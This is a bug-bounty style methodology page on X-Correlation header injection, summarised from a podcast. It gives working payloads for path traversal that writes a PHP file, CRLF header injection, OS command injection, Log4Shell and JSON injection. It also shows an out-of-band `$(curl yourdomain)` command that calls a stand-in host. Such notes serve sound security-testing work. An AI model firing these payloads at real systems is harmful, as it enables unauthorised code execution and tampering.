# X-Correlation Injection

### Reference

{% embed url="https://blog.criticalthinkingpodcast.io/p/hackernotes-ep86-xcorrelation-frans-rce-research-drop" %}

#### Summary Notes on X-Correlation Injection

**Overview**:

* Correlation headers (e.g., `X-Request-ID`, `X-Correlation-ID`) track requests for debugging but expand attack surface via interactions with file systems, CI pipelines, logging, and backend services.
* Vulnerabilities: Path traversal, header injection, OS command injection, Log4Shell, JSON injection.
* Risks: User-controlled, often unvalidated; reflection in responses is a strong indicator.
* False Positives: Regex validation (e.g., UUID format) or endpoint restrictions.

***

### Testing Methodology

**1. Identify Headers**

* Inspect response headers and `access-control-*` for `-id` or `id` headers.
* Search proxy logs (e.g., Burp) for similar headers.
* Test reflection: Add `X-Request-ID: test123` and check if echoed in response.

**2. Fuzz Headers**

* **Error-Based**: Inject special chars (e.g., `' " % & > [ $`). Test site functionality; watch for 500s or odd behaviors.
* **Blind/OOB**: Use payloads like blind XSS, OOB RCE (e.g., `$(curl yourdomain)`), SQLi DNS, Log4Shell. Monitor OOB server (e.g., Burp Collaborator).
* Optimize Payloads: Minimize special chars; use `$IFS` for spaces; add unique IDs; collect data (e.g., `whoami` via bash script); set alerts (e.g., Slack webhook).

**3. Test Specific Payloads**

* **Path Traversal/File Write**: `x-request-id: ../../../../var/www/html/<?phpinfo()?>.php`
* **Header Injection**: `x-request-id: 1%0d%0ax-account:456`
* **Java Header Injection**: `x-request-id: 1%c4%8d%c4%8anew-header: f00`
* **OS Command Injection**: `x-request-id: $(id)`
* **Log4Shell**: `x-request-id: ${jndi:rmi://x${sys:java.version}.yourdomain/a}`
* **JSON Injection**: `x-request-id: 1"}. "payload":{"account":"456","foo":"`

**4. JSON Injection Focus**

* Determine Context: Test `"` vs. `\"`; check premature endings (e.g., `1"}x}}` vs. `1"}}}x`).
* Duplicate Properties: `1", "foo":{"foo":"` + `"}, "id": "4567`
* Scenarios: S3 policy manipulation; JWT property injection (e.g., add `scope` or `user`).
* Wordlists: Build from API docs, traffic, Wayback; maintain casing.

**5. Analyze & Document**

* Confirm: OOB logs, behavior changes, file access.
* Impact: File writes, API manipulation, RCE, privilege escalation.
* Tools: Burp Suite (Repeater/Intruder), OOB servers, custom scripts.

***

#### Key Takeaways

* Treat headers as multi-context inputs; fuzz for errors and OOB.
* JSON injection often blind—probe with context breaks and duplicates.
* End payloads with `“`, `\”`, or `\` for detection.
* Resources: Unicode converter (https://r12a.github.io/app-conversion/); Podcast (https://www.criticalthinkingpodcast.io/tlbook).
